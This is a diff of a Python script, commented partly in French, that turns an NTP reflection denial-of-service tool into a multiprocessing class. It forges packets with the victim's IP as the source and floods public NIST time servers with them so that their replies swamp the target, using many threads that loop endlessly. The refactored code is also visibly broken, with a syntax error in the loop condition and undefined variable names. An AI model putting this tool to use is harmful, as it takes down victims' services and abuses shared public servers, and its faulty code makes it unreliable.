@@ -9,54 +9,87 @@ import sys
 import threading
 import time
 import random
+import multiprocessing
+from ipaddress import IPv4Address
 """
-Ce programme execute une NTP DoS attack
+Ce programme execute une NTP DoS attack autant qu'un stand alone process
 IL FAUT QUE LE NOMBRE DE THREAD SOIT SUPERIEUR AU NOMBRE DE SERVEURS
 Principe : 
     Principalment on va emmerger la cible par des paquets UDP en utilisant les serveurs ntp
     et leurs protocle respectifs en recréant les paquets qu'ils transmettent d'habitude.
 """
-#Definition de certaines variables 
-global ntplist
-global currentserver
-global data
-global target
 
-data = "\x17\x00\x03\x2a" + "\x00" * 4
-
-ntplist = ['time-a-g.nist.gov', 'time-b-g.nist.gov', 'time-c-g.nist.gov',
+class NtpFlood(multiprocessing.Process):
+    """
+    Ntp flood attack as a class/process to be used in the main program
+    """
+    data = "\x17\x00\x03\x2a" + "\x00" * 4 #magic payload <3 <3 
+    ntplist = ['time-a-g.nist.gov', 'time-b-g.nist.gov', 'time-c-g.nist.gov',
                 'time-d-g.nist.gov', 'time-d-g.nist.gov', 'time-e-g.nist.gov',
                 'time-e-g.nist.gov', 'time-a-b.nist.gov', 'time-b-b.nist.gov',
                 'time-c-b.nist.gov', 'time-d-b.nist.gov', 'time-d-b.nist.gov']
- 
-currentserver = 0 #fixing UnboundlocalError
-def dosEm(target, ntplist, data, currentserver):
+    
+    def __init__(self):
         """
-        Fonction qui construit un paquet et qui l'envoie
+        Init the attack , and override the process class to
+        make sure the process runs as stand alone procces that will handle
+        it's own threads
         """
-        ntpserver = ntplist[currentserver] #LOAD THE SERVER
-        packet = IP(dst=ntpserver,src=target)/UDP(sport=48947,dport=1203)/Raw(load=data) #CONSTRUIRE LE PAQUER
-        send(packet,loop=1) #ENVOYER 
+        multiprocessing.Process.__init__(self)
+        self.nuberOfThreads = 5
+        self.data = data
+        self.ntplist = ntplist
+        self.index = 0
+        self.target = None
+    
+    def __call__(self):
+        """
+        calling the class will intitiate it with the question asking stuff 
+        """
+        questions = [
+            {
+                'type': 'input',
+                'name': 'target',
+                'message': 'IP of the Target(needs to be an ip address) :',
+                'validate': IpValidator
+            },
+            {
+                'type': 'input',
+                'name': 'thrdz',
+                'message': 'number Of threads',
+                'validate': IntValidator
+            }
+        ]
+        answers = prompt(questions, style=style)
+        self.target = answers.get("target")
+        self.nuberOfThreads = answers.get("thrdz")
+        self.run()
+    
+    def makePackets(self):
+        """
+        function that construuts a load of Packets
+        """
+        ntpserver = self.ntplist[self.index]
+        packet = IP(dst=ntpserver, src=self.target)/UDP(sport=48947, dport=1598)/Raw(load=data)
+        send(packet, loop=1)
+        self.index.value= (self.index+1 )% 12 #Pour ne pas avoir un IndexError
 
-def floodNTP(numberthreads, targget):
-        #initialisation
-        threads = []
-        global currentserver
-        print("Starting to flood: "+ str(targget) + " using NTP list: " 
-                + str(ntplist) + " With " + str(numberthreads) + " threads")
-        print("Use CTRL+C to stop attack")
-        
-        #Automatisation de l'attaque 
-        for n in range(numberthreads):
-            thread = threading.Thread(target=dosEm(targget, ntplist, data, currentserver))
-            thread.daemon = True
-            thread.start()
-        
-            threads.append(thread)
-        
-            print(f"Sending for the {0}...",n)
-            currentserver = currentserver + 1 #InCRÉMENTER
+    def run(self):
+        """
+        function that Runs the flooding procces
+        """
+        try:
+            threads = []
+            print("Ctrl + C to stop the attack !! =)")
+            print("Starting the attack ...")
+            print("Starting to flood: "+ str(targget) + " using NTP list: " + str(ntplist) + " With " + str(numberthreads) + " threads")
+            while stop_threads = True:
+                for t in range(self.numberthreads):
+                    thread = threading.Thread(target=makePackets)
+                    thread.deamon = True
+                    thread.start()
+                    threads.append(thread) 
+        except KeyboardInterrupt:
+            for thread in threads:
+                thread.kill()
 
-        #Boucle pour que le Ctrl+c met fin au script
-        while True:
-            time.sleep(1)
